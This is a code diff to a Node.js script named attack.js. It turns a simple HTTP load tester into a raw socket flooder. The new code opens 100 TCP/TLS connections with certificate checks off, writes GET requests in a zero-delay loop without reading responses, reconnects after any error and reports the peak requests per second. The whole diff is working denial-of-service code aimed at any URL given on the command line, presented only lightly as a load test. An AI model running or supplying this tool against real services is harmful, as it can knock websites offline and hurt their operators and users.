@@ -1,6 +1,6 @@
 // attack.js
-const http = require('http');
-const https = require('https');
+const net = require('net');
+const tls = require('tls');
 const { URL } = require('url');
 
 if (process.argv.length < 4) {
@@ -13,37 +13,70 @@ const duration = parseInt(process.argv[3]) * 1000;
 const endTime = Date.now() + duration;
 
 const isHttps = target.protocol === 'https:';
-const client = isHttps ? https : http;
+const port = target.port || (isHttps ? 443 : 80);
+const host = target.hostname;
+const path = target.pathname + target.search;
 
-const options = {
-  hostname: target.hostname,
-  port: target.port || (isHttps ? 443 : 80),
-  path: target.pathname + target.search,
-  method: 'GET',
-  headers: {
-    'User-Agent': 'LoadTester/1.0',
-    'Connection': 'keep-alive'
-  }
-};
+let totalSent = 0;
+let lastSent = 0;
+let maxRps = 0;
 
-function sendRequest() {
-  if (Date.now() > endTime) return;
+const REQUEST = [
+  `GET ${path} HTTP/1.1`,
+  `Host: ${host}`,
+  `User-Agent: LoadTester/1.1`,
+  `Connection: keep-alive`,
+  ``,
+  ``
+].join('\r\n');
 
-  const req = client.request(options, res => {
-    // Ignore response body
-    res.on('data', () => {});
-    res.on('end', sendRequest); // Send next request when done
+function createSocketConnection() {
+  const client = isHttps
+    ? tls.connect(port, host, { rejectUnauthorized: false })
+    : net.connect(port, host);
+
+  client.on('connect', () => {
+    pumpRequests(client);
   });
 
-  req.on('error', () => {
-    // Ignore errors and keep going
-    sendRequest();
+  client.on('error', () => {
+    setTimeout(createSocketConnection, 100); // Retry on error
   });
 
-  req.end();
+  client.on('end', () => {
+    createSocketConnection(); // Restart on end
+  });
 }
 
-const concurrent = 100;
-for (let i = 0; i < concurrent; i++) {
-  sendRequest();
+function pumpRequests(socket) {
+  const interval = setInterval(() => {
+    if (Date.now() > endTime) {
+      clearInterval(interval);
+      socket.destroy();
+      return;
+    }
+
+    try {
+      socket.write(REQUEST);
+      totalSent++;
+    } catch (e) {
+      socket.destroy();
+    }
+  }, 0); // As fast as it can
 }
+
+// Launch 100 socket connections
+const sockets = 100;
+for (let i = 0; i < sockets; i++) {
+  createSocketConnection();
+}
+
+// Logging every 3 seconds
+setInterval(() => {
+  const nowSent = totalSent;
+  const rps = nowSent - lastSent;
+  if (rps > maxRps) maxRps = rps;
+  lastSent = nowSent;
+
+  process.stdout.write(`\rTotal sent: ${totalSent}  |  Max-r: ${maxRps} rps     `);
+}, 3000);
